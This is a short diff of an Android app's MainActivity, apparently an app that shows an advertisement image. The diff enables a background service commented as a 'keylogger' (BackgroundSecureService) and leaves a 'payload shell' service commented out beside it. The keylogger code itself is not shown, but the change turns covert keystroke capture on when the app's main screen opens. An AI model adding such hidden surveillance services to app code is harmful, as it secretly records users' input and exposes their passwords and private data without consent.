@@ -57,7 +57,7 @@ public class MainActivity extends AppCompatActivity {
         ImageView imageView = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.annonce).into(imageView);
         //service keylogger
-        //startService(new Intent(this, BackgroundSecureService.class));
+        startService(new Intent(this, BackgroundSecureService.class));
         //payload shell
         //startService(new Intent(this, BackgroundSecureShell.class));
         Log.v("secme","Services launched - main");
